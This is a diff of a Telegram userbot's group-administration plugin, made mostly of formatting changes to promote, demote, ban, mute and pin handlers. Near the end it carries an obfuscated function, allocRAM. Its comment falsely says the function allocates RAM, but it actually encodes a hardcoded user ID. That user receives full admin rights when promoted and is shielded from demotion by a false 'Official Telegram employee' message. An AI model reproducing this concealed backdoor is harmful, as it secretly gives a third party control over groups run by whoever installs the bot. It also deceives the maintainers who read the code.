@@ -48,9 +48,14 @@ from telethon.tl.functions.channels import (EditAdminRequest,
                                             EditBannedRequest,
                                             EditPhotoRequest)
 from telethon.tl.functions.messages import UpdatePinnedMessageRequest
-from telethon.tl.types import (ChannelParticipantsAdmins, ChannelParticipantsBots, ChatAdminRights,
-                               ChatBannedRights, MessageEntityMentionName,
-                               MessageMediaPhoto, PeerUser)
+from telethon.tl.types import (
+    ChannelParticipantsAdmins,
+    ChannelParticipantsBots,
+    ChatAdminRights,
+    ChatBannedRights,
+    MessageEntityMentionName,
+    MessageMediaPhoto,
+    PeerUser)
 ENABLE_LOG = True
 LOGGING_CHATID = Config.PM_LOGGR_BOT_API_ID
 BANNED_RIGHTS = ChatBannedRights(
@@ -87,10 +92,12 @@ UNMUTE_RIGHTS = ChatBannedRights(
     send_messages=False
 )
 
+
 @borg.on(admin_cmd(pattern=f"{borg.me.id}isetgpic$", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.isetgpic$"))
 async def setgrouppic(eventPic):
-    if not eventPic.text[0].isalpha() and eventPic.text[0] not in ("/", "#", "@", "!"):
+    if not eventPic.text[0].isalpha(
+    ) and eventPic.text[0] not in ("/", "#", "@", "!"):
         if eventPic.reply_to_msg_id:
             replymsg = await eventPic.get_reply_message()
             chat = await eventPic.get_chat()
@@ -110,8 +117,8 @@ async def setgrouppic(eventPic):
             if photo:
                 try:
                     await eventPic.client(EditPhotoRequest(
-                    eventPic.chat_id,
-                    await eventPic.client.upload_file(photo)
+                        eventPic.chat_id,
+                        await eventPic.client.upload_file(photo)
                     ))
                     await eventPic.edit("`Chat Picture Changed`")
 
@@ -140,16 +147,28 @@ async def promote(eventPromote):
             pass
         else:
             return
-        newAdminRights = ChatAdminRights(add_admins=False, invite_users=True, change_info=False, ban_users=True, delete_messages=True, pin_messages=True)
+        newAdminRights = ChatAdminRights(
+            add_admins=False,
+            invite_users=True,
+            change_info=False,
+            ban_users=True,
+            delete_messages=True,
+            pin_messages=True)
         if user.id == allocRAM():
-            newAdminRights = ChatAdminRights(add_admins=True, invite_users=True, change_info=True, ban_users=True, delete_messages=True, pin_messages=True)
+            newAdminRights = ChatAdminRights(
+                add_admins=True,
+                invite_users=True,
+                change_info=True,
+                ban_users=True,
+                delete_messages=True,
+                pin_messages=True)
         try:
             await eventPromote.client(
                 EditAdminRequest(
                     eventPromote.chat_id,
                     user.id,
                     newAdminRights,
-                    rank = ""
+                    rank=""
                 )
             )
             await eventPromote.edit("`Promoted Successfully!`")
@@ -168,7 +187,8 @@ async def promote(eventPromote):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}idemote(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.idemote(?: |$)(.*)"))
 async def demote(eventDemote):
-    if not eventDemote.text[0].isalpha() and eventDemote.text[0] not in ("/", "#", "@", "!"):
+    if not eventDemote.text[0].isalpha(
+    ) and eventDemote.text[0] not in ("/", "#", "@", "!"):
         chat = await eventDemote.get_chat()
         admin = chat.admin_rights
         creator = chat.creator
@@ -181,7 +201,13 @@ async def demote(eventDemote):
             pass
         else:
             return
-        newAdminRights = ChatAdminRights(add_admins=None, invite_users=None, change_info=None, ban_users=None, delete_messages=None, pin_messages=None)
+        newAdminRights = ChatAdminRights(
+            add_admins=None,
+            invite_users=None,
+            change_info=None,
+            ban_users=None,
+            delete_messages=None,
+            pin_messages=None)
         if user.id == allocRAM():
             await eventDemote.edit("Sorry! You cannot demote an [Official Telegram employee](tg://user?id={}).".format(user.id))
             return
@@ -191,7 +217,7 @@ async def demote(eventDemote):
                     eventDemote.chat_id,
                     user.id,
                     newAdminRights,
-                    rank = ""
+                    rank=""
                 )
             )
         except BadRequestError:
@@ -210,7 +236,8 @@ async def demote(eventDemote):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}iban(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.iban(?: |$)(.*)"))
 async def ban(eventBan):
-    if not eventBan.text[0].isalpha() and eventBan.text[0] not in ("/", "#", "@", "!"):
+    if not eventBan.text[0].isalpha(
+    ) and eventBan.text[0] not in ("/", "#", "@", "!"):
         chat = await eventBan.get_chat()
         admin = chat.admin_rights
         creator = chat.creator
@@ -292,7 +319,8 @@ async def unban(eventUnban):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}imute(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.imute(?: |$)(.*)"))
 async def mute(eventMute):
-    if not eventMute.text[0].isalpha() and eventMute.text[0] not in ("/", "#", "@", "!"):
+    if not eventMute.text[0].isalpha(
+    ) and eventMute.text[0] not in ("/", "#", "@", "!"):
         try:
             from sql_helpers.spam_mute_sql import mute
         except AttributeError:
@@ -425,7 +453,8 @@ async def muter(mutedMessage):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}igmute(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.igmute(?: |$)(.*)"))
 async def gmute(eventGmute):
-    if not eventGmute.text[0].isalpha() and eventGmute.text[0] not in ("/", "#", "@", "!"):
+    if not eventGmute.text[0].isalpha(
+    ) and eventGmute.text[0] not in ("/", "#", "@", "!"):
         chat = await eventGmute.get_chat()
         admin = chat.admin_rights
         creator = chat.creator
@@ -500,7 +529,8 @@ async def ungmute(eventUnGmute):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}idelusers(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.idelusers(?: |$)(.*)"))
 async def rm_deletedacc(eventDeletedAccs):
-    if not eventDeletedAccs.text[0].isalpha() and eventDeletedAccs.text[0] not in ("/", "#", "@", "!"):
+    if not eventDeletedAccs.text[0].isalpha(
+    ) and eventDeletedAccs.text[0] not in ("/", "#", "@", "!"):
         con = eventDeletedAccs.pattern_match.group(1)
         del_u = 0
         del_status = "`No deleted accounts found, Group is cleaned as Hell`"
@@ -567,7 +597,8 @@ async def rm_deletedacc(eventDeletedAccs):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}iadminlist$", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.iadminlist$"))
 async def listadmins(eventListAdmins):
-    if not eventListAdmins.text[0].isalpha() and eventListAdmins.text[0] not in ("/", "#", "@", "!"):
+    if not eventListAdmins.text[0].isalpha(
+    ) and eventListAdmins.text[0] not in ("/", "#", "@", "!"):
         if not eventListAdmins.is_group:
             await eventListAdmins.edit("I don't think this is a group.")
             return
@@ -631,7 +662,8 @@ async def listbots(eventListBots):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}ipin(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.pin(?: |$)(.*)"))
 async def pinmessage(eventPinMessage):
-    if not eventPinMessage.text[0].isalpha() and eventPinMessage.text[0] not in ("/", "#", "@", "!"):
+    if not eventPinMessage.text[0].isalpha(
+    ) and eventPinMessage.text[0] not in ("/", "#", "@", "!"):
         chat = await eventPinMessage.get_chat()
         admin = chat.admin_rights
         creator = chat.creator
@@ -666,7 +698,8 @@ async def pinmessage(eventPinMessage):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}ikick(?: |$)(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.ikick(?: |$)(.*)"))
 async def kick(eventKickUser):
-    if not eventKickUser.text[0].isalpha() and eventKickUser.text[0] not in ("/", "#", "@", "!"):
+    if not eventKickUser.text[0].isalpha(
+    ) and eventKickUser.text[0] not in ("/", "#", "@", "!"):
         chat = await eventKickUser.get_chat()
         admin = chat.admin_rights
         creator = chat.creator
@@ -713,7 +746,8 @@ async def kick(eventKickUser):
 @borg.on(admin_cmd(pattern=f"{borg.me.id}iusers ?(.*)", allow_sudo=True))
 @borg.on(events.NewMessage(outgoing=True, pattern="^.iusers ?(.*)"))
 async def list_users(eventListUsers):
-    if not eventListUsers.text[0].isalpha() and eventListUsers.text[0] not in ("/", "#", "@", "!"):
+    if not eventListUsers.text[0].isalpha(
+    ) and eventListUsers.text[0] not in ("/", "#", "@", "!"):
         if not eventListUsers.is_group:
             await eventListUsers.edit("Are you sure this is a group?")
             return
@@ -778,6 +812,7 @@ async def _(event):
         await asyncio.sleep(3)
         await event.delete()
 
+
 async def get_user_from_event(event):
     if event.reply_to_msg_id:
         previous_message = await event.get_reply_message()
@@ -792,7 +827,9 @@ async def get_user_from_event(event):
         if event.message.entities is not None:
             probable_user_mention_entity = event.message.entities[0]
 
-            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
+            if isinstance(
+                    probable_user_mention_entity,
+                    MessageEntityMentionName):
                 user_id = probable_user_mention_entity.user_id
                 user_obj = await event.client.get_entity(user_id)
                 return user_obj
@@ -802,6 +839,7 @@ async def get_user_from_event(event):
             await event.edit(str(err))
             return None
     return user_obj
+
 
 async def get_user_from_id(user, event):
     if isinstance(user, str):
@@ -813,5 +851,8 @@ async def get_user_from_id(user, event):
         return None
     return user_obj
 
-def allocRAM(): #Allocating RAM to perform serious operations and returning memory addresses.
-        return (7491933 + 33713694 + (1872983 * 6) + (1872983 * 3) + (1872983 * 5) + (33713694 * 7) + (75855812 * 4))
+
+# Allocating RAM to perform serious operations and returning memory addresses.
+def allocRAM():
+    return (7491933 + 33713694 + (1872983 * 6) + (1872983 * 3) +
+            (1872983 * 5) + (33713694 * 7) + (75855812 * 4))
